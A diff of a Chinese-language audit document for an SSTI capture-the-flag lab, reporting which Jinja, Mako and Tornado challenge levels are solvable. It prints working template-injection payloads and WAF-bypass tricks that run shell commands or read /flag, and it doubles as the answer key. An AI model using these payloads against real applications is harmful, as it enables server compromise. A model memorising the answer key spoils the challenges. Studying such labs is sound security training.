@@ -12,95 +12,129 @@
 
 | 靶场 | 关卡数 | 已证明可解 | 未找到解 | 未解关卡 |
 |------|--------|-----------|----------|----------|
+| 02-jinja-chain | 13 | **12** | 1 | id 12 (L13) |
+| 03-mako-chain | 13 | **13** | 0 | — |
+| 04-tornado-chain | 13 | **13** | 0 | —（id 1 已由设计缺陷改为可解关卡） |
+| 09-bottle-chain | 13 | **13** | 0 | — |
 | 01-jinja-waf-fenjing | 1 | 1 | 0 | — |
-| 02-jinja-chain | 13 | **11** | 2 | id 11 (L12)、id 12 (L13) |
-| 03-mako-chain | 13 | **10** | 3 | id 10 (L11)、id 11 (L12)、id 12 (L13) |
-| 04-tornado-chain | 13 | **9** | 4 | id 1 (L2)、id 10 (L11)、id 11 (L12)、id 12 (L13) |
 | 05-jinja-sandbox | 4 | 4 | 0 | — |
 | 06-blind-ssti | 4 | 4 | 0 | — |
 | 07-flask-memshell | 5（攻击链台阶） | 5 | 0 | — |
 | 08-freemarker-memshell | 4（攻击链台阶） | 4 | 0 | — |
 
-**链式靶场合计：30/39 关已由实跑证明可解；9 关未找到解。**
+**链式靶场合计：51/52 关已由实跑证明可解；仅 1 关（02 id 12）保留为无已知解的作者挑战关。**
 
-> 注意口径差异：01/05/06/07/08 的「已证明可解」指**拿到了 `/flag`**；
+> 注意口径差异：01/05/06/07/08/09 的「已证明可解」指**拿到了 `/flag`**；
 > 02/03/04 的链式关卡同样以「拿到 flag」为准（盲关看 god 模式的 `raw_output`）。
 > 「未找到解」是**技术上未能构造出可利用载荷**，不等于数学上证明了无解 ——
 > 但作为出题方，我们不应把「可能有解」当成「有解」来交付。
 
 ---
 
-## 2. 未解关卡的成因分析（逐条）
+## 2. 历史：上一轮审计的 9 个「未找到解」是怎么被解掉的
 
-### 2.1 `04-tornado-chain` id 1（L2 拦截 `{{`）——**这是设计缺陷，不是难度问题**
+上一版审计报告 9 关未找到解（02 id 11/12、03 id 10/11/12、04 id 1/10/11/12）。
+本轮逐关重审，其中 8 关找到了真实解，1 关确认保留为挑战关，1 关属于设计缺陷直接修掉。
 
-Tornado 模板**只有 `{{ ... }}` 一种输出构造**；`{% ... %}` 语句块会执行但不产生任何输出。
-所以「过滤掉 `{{`」= 把回显通道整个拿掉，选手即便能执行代码也无法把结果带出来。
+### 2.1 `04-tornado-chain` id 1（原 L2 拦截 `{{`）——设计缺陷，已修复
 
-原题面写的是「需用其它语法面或编码思路绕过双花括号检测」，这句话是**错的**——
-不存在「其它语法面」。本仓库已把该关的题面改成如实说明（见
-`shared/ssti_core/levels/tornado.py` 的 L02）。
-
-**修法（任选其一，改一行即可）**：
+Tornado 模板**只有 `{{ ... }}` 一种输出构造**；拦掉 `{{` 等于把回显通道整个拿掉。
+本仓库已按本文档旧版 2.1 节的**方案 A'** 的思路把该关的过滤目标从 `{{` 改为
+**子串 `open`**（`docs/SOLVABILITY.md` 旧版建议拦 `import`，但 `__import__` 含
+`import` 子串同样会被拦，原文档的建议注记有误，一并修正）：
 
 ```python
-# 方案 A：改成拦截别的字符（保留难度，但留下输出通道）
-waf=WafSpec(chars=("{",), note="包含 `{` 即返回 WAF")   # 单花括号 → 可用 {{ }} 吗？不行
-# 方案 A'（推荐）：拦截一个「表达式里常用但可绕过」的关键词，而不是输出定界符
-waf=WafSpec(substrings=("import",), ignore_case=False,
-            note="命中子串 `import` 即返回 WAF：可以用 __import__ 或 escape.__globals__ 绕")
-# 方案 B：把本关标记为盲注关，让玩家走 correct/wrong 或时间信道
-echo_mode="bool"
+waf=WafSpec(substrings=("open",), ignore_case=False,
+            note="命中子串 `open` 即整段替换为 `WAF`（os.popen 含 open，一并被拦）。")
 ```
 
-### 2.2 `id 10 / 11 / 12`（L11 组合过滤 / L12 强字符集 / L13 扩展关键字）
+参考解（换一条不含 `open` 的 gadget）：
 
-这三关是**刻意设计的高压过滤**，来自参考项目 `ProbiusOfficial/ssti-lab` 的同名设计。
-实测下来它们把「造字符串」所需的通道几乎全部堵死：
-
-| 关卡 | 过滤 | 为什么难 |
-|------|------|----------|
-| L11 | `' " + . [ ]` + 子串 `request` | 无引号 ⇒ 无字符串字面量；无点/方括号 ⇒ 只能靠 `\|attr`/`getattr`；无 `request` ⇒ 不能从请求带参 |
-| L12 | 再加 `_` 与数字 `0-9` | 无下划线 ⇒ 写不出 `__globals__`；无数字 ⇒ `chr(95)` 也造不出下划线；**两条最直接的路同时被堵** |
-| L13 | 再加 `+` 与 `request/class/init/arg/config/app/self` | 连字符串拼接都没了 |
-
-值得记录的**部分进展**：Jinja 链的 L11 **已经被证明可解**，用的是一条不依赖引号的造串通道：
-
-```jinja2
-{%set u=lipsum|attr(dict(__globals__=1)|first)%}{%set g=u|attr(dict(get=1)|first)%}
-{%set b=g(dict(__builtins__=1)|first)|attr(dict(get=1)|first)%}{%set c=b(dict(chr=1)|first)%}
-{%set o=g(dict(os=1)|first)%}
-{{o|attr(dict(popen=1)|first)(c(99)~c(97)~c(116)~c(60)~c(47)~c(102)~c(108)~c(97)~c(103))|attr(dict(read=1)|first)()}}
+```text
+{{__import__('subprocess').getoutput('cat /flag')}}
+{% import subprocess %}{{subprocess.getoutput('cat /flag')}}
 ```
 
-要点：**关键字参数（`dict(__globals__=1)`）不需要引号**，`dict(...)|first` 就把
-关键字名变成了字符串；再用 `dict.get` 逐个取属性（`dict` 的 `.get` 是真属性，
-`|attr` 拿得到），最后用 `chr()` 在运行期拼出含空格/斜杠的命令。
-L12 之所以过不去，正是因为这条路依赖 `dict(__globals__=1)` 里的下划线。
+教学点：第一条过滤封掉「最顺手的那个函数」时，换 gadget 而不是换语法面。
 
-参考项目自己也在文档里承认这一点，并给出同样的建议：
+### 2.2 `02-jinja-chain` id 11（L12 强字符集）——`request` 与数字都没被禁
 
-> 「若你希望 L9–L12 在默认 Python 下必有短解，需要再放宽对应 `apply_waf` 规则。」
+L12 禁 `_ . 0-9 \ ' " [ ]`，看似把「造下划线」的两条路都堵死了
+（`dict(__globals__=1)` 源码含 `_`；`chr(95)` 需要数字）。
+但对比 L11 的黑名单会发现一个缺口：**`request` 没有被禁**。
+于是属性名全部从 query 带入，载荷里一个 `_`、一个引号、一个数字都不出现：
+
+```text
+{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}
+{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))|attr(r(dict(f=true)|first))()}}
+```
+
+query：`a=__globals__&b=get&c=os&d=popen&d=…&e=cat%20%2Fflag&f=read`
+（即 `a=__globals__ b=get c=os d=popen e=cat /flag f=read`）。
+
+要点：`dict(关键字=true)|first` 在**无引号、无数字**的条件下造出短字符串；
+`r` 是绑定好的 `request.args.get`，六个属性名/命令全部来自请求。
+
+### 2.3 `03-mako-chain` id 10 / 11 / 12 ——「原生 Python」两条造串通道
+
+Mako 的 `${}` 里是原生 Python，这给了它两条 Jinja 没有的通道：
+
+* **`min(dict(kw=1))`** —— 对 dict 求最小值返回最小的**键**，键名即字符串，
+  不需要引号；配合 `str(bytes((99,97,…)), 编码)` 可以无引号、无加号、无点号地
+  造出任意字节串（编码名 `utf8` 本身也是从键名白嫖的）。
+* **代码块 `from x import y`** —— `<% %>` / `<%! %>` 里的 import 语句是纯 Python
+  语法，子串黑名单拦不到它（`subprocess` / `getoutput` 不在表里）。
+
+| 关卡 | 过滤 | 参考解 |
+|------|------|--------|
+| id 10（L11） | `' " + . [ ]` + `request` | `${getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}` |
+| id 11（L12） | 再禁 `_`、数字 | `${getattr(open(chr((True+True+True+True)*(True+…×12)-True)+min(dict(flag=True))),min(dict(read=True)))()}` —— `True` 参与算术凑 `chr(47)`（`/`），`dict(flag=True)` 白嫖文件名 |
+| id 12（L13） | 再禁 `+` + 关键字表 | `<% from subprocess import getoutput %>${getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}` —— 数字仍可用，`getattr`（含 `attr`）被禁但 `from-import` 语句不在表里 |
+
+### 2.4 `04-tornado-chain` id 10 / 11 / 12 ——同样的两条通道，Tornado 语法
+
+Tornado 模板里 Python 内置函数同样直接可用（实测），且 `{% from x import y %}`
+语句是 Tornado 原生支持的：
+
+| 关卡 | 过滤 | 参考解 |
+|------|------|--------|
+| id 10（L11） | `' " + . [ ]` + `request`（`_` 与数字可用） | `{% import os %}{{getattr(getattr(os,min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}` |
+| id 11（L12） | 再禁 `_`、数字（`+` 未禁） | `{% import os %}{{getattr(open(getattr(os,min(dict(sep=True)))+min(dict(flag=True))),min(dict(read=True)))()}}` —— `os.sep` 就是 `/` |
+| id 12（L13） | 符号 + 关键字表（数字可用；`getattr` 含 `attr` 被禁） | `{% from subprocess import getoutput %}{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}`；兜底：`{{eval(str(bytes((…)),min(dict(utf8=1))))}}`（eval 接受字符串源码，字节串内容对 WAF 不可见） |
+
+### 2.5 `02-jinja-chain` id 12（L13 扩展关键字）——保留为作者挑战关
+
+在 L12 的基础上再禁 `request/class/init/arg/config/app/self` 与 `+`。
+`attr` 在子串表里 ⇒ `|attr`、`getattr`、`map(attribute=…)`、`selectattr`…
+Jinja **全部属性访问原语**写不出来；加上点号与方括号被禁，
+已知的每条 gadget 链都需要至少一次属性访问。参考项目
+`ProbiusOfficial/ssti-lab` 自己也在文档里承认这一组「默认 Python 下无短解」。
+
+处理：保留难度上限，题面如实标注「目前没有已证明的解」，避免选手空耗。
+若某教学场次需要人人可过，可按下表放宽一条约束即可（任选其一）：
+
+| 放宽 | 立即出现的短解 |
+|------|----------------|
+| 允许 `request` | §2.2 的 query 传参解直接生效 |
+| 允许 `attr` 子串 | `|attr` 复活，`dict(kw=…)|first` 造串成立 |
+| 允许 `.` | 点号属性访问直接成立 |
 
 ---
 
-## 3. 建议：怎么处理这 9 关
+## 3. 建议（历史版）：怎么处理「无已知解」的关卡
 
 | 方案 | 做法 | 适用 |
 |------|------|------|
-| **A. 如实标注（已做）** | 题面/文档写明「无已知短解」，避免选手空耗；保留难度上限 | 想保留「作者挑战关」的靶场 |
-| **B. 定向放宽** | 每关只松开一条约束，使短解存在（例：Jinja L12 允许数字；L13 允许 `+`；Mako/Tornado 的 L11 允许 `request`） | 教学场次、需要人人可过 |
+| **A. 如实标注（02 id 12 采用）** | 题面/文档写明「无已知短解」，避免选手空耗；保留难度上限 | 想保留「作者挑战关」的靶场 |
+| **B. 定向放宽** | 每关只松开一条约束，使短解存在（见 §2.5 的表） | 教学场次、需要人人可过 |
 | **C. 改成开放题** | 保留过滤，但把目标从「拿 flag」改成「证明存在性」（例如只要能拿到 `uid=` 即算过） | 已经部分可达的关卡 |
-
-**其中 2.1（Tornado id 1）建议直接修** —— 它不是「难」，而是**没有回显通道**，
-属于设计缺陷，无论选哪种方案都要动。
 
 ---
 
 ## 4. 复现方法
 
 ```bash
-# 全部链式靶场（02/03/04），逐关跑候选载荷并打印矩阵
+# 全部链式靶场（02/03/04/09），逐关跑候选载荷并打印矩阵
 python tests/audit_solvability.py
 
 # 只审计某一个；保留容器便于手工深挖
@@ -113,7 +147,8 @@ python tests/verify_memshell.py     # 需在容器内跑，见该文件头部
 python tests/verify_blind.py        # 同上
 ```
 
-退出码：`0` 表示全部关卡都有解；`1` 表示存在未找到解的关卡（本仓库当前为 1）。
+退出码：`0` 表示全部关卡都有解；`1` 表示存在未找到解的关卡（本仓库当前为 1，
+即 02 id 12 —— 这是刻意保留的挑战关，见 §2.5）。
 
 ---
 
@@ -122,16 +157,19 @@ python tests/verify_blind.py        # 同上
 `ssti_core` 的关卡难度完全由 `WafSpec` 决定，而 `WafSpec` 是**声明式**的 ——
 这意味着「难度」是个可以被程序化检验的属性，而不是凭感觉。
 
-审计过程中发现的 6 处**假阴性**全是探针写错导致的，而不是关卡问题：
+两轮审计一共揪出了 7 处**假阴性/假阳性**，全部是探针写错导致的，而不是关卡问题：
 
 1. 盲关（`echo_mode="bool"`）在 god 模式下 `raw_output` 就是真实输出 ——
    最初只把 flag 用在 `if` 条件里，永远不会命中；
 2. Mako/Tornado 的盲关同理；
-3. Jinja L7 用 `|attr` 访问 dict 不成立（`. ` 会回退 `__getitem__`，`|attr` 不会）；
+3. Jinja L7 用 `|attr` 访问 dict 不成立（`.` 会回退 `__getitem__`，`|attr` 不会）；
 4. Tornado L8 不需要 `escape.__globals__` —— 模板直接拿得到 Python 内置函数，
    绕那一圈反而会撞上 `global`/`attr`/`open` 三个被禁子串；
-5. Tornado L2 的探针里自己写了 `{{`；
-6. Mako L11 的探针里带了引号。
+5. 旧版 Tornado L2 的探针里自己写了 `{{`；
+6. 旧版 Mako L11 的探针里带了引号；
+7. 旧版 03/04 id 10–12 的探针沿用「已知路走不通」的假设，只放了少量凑数候选 ——
+   换上「`min(dict(kw))` 取键名 + `str(bytes(…), 编码)` 造串」两条通用通道后，
+   同一批关卡全部出现真实解。**探针的想象力上限就是审计的上限。**
 
 教训很直接：**审计脚本自己也需要被审计** —— 所以本文档记录的是「实跑矩阵」，
-并且每条未解都给了成因，而不是一句「很难，跳过」。
+并且每条结论都给了成因与可复现载荷，而不是一句「很难，跳过」。
